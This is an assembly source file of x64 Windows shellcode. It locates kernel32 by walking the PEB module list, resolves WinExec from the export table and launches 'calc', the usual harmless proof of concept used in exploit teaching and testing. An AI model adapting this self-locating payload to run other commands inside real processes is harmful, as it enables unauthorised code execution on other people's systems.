

	.file "example2.S"

	.text
	.align 16	
	.globl _start
	.org 0x0, 0x0
	
_start:
	pushq	%rbp
	subq	$0x40, %rsp
	movq	%gs:0x60, %rsi
	movq	0x18(%rsi),%rsi
	movq	0x10(%rsi), %rsi
	movq	(%rsi), %rsi
	movq	(%rsi), %rsi
	movq	0x30(%rsi), %rdi
	xorq	%rdx, %rdx
	movq	$0x60, %rdx
	addl	0x3c(%rdi), %edx
	movl	0x28(%rdi, %rdx), %ebx
	movl	0x20(%rdi, %rbx), %esi
	addq	%rdi, %rsi
	movl	0x24(%rdi, %rbx), %edx
findexec:
	movzwl	(%rdi, %rdx), %ebp
	leal	0x2(%rdx), %edx
	lodsl	(%rsi)
	movabs	$0x636578456e6957, %r8
	cmpq	%r8, (%rdi, %rax)
	jne	findexec
	movl	0x1c(%rdi, %rbx), %esi
	addq	%rdi, %rsi
	movl	(%rsi, %rbp, 0x4), %esi
	addq	%rsi, %rdi
	cdq
	leaq	calcstr(%rip), %rcx
	movq	$0x5, %rdx
	callq	*%rdi
	addq	$0x40, %rsp
	popq	%rbp
	ret
calcstr:	.byte	'c','a','l','c',0x0,0x0,0x0,0x0

	.end
	
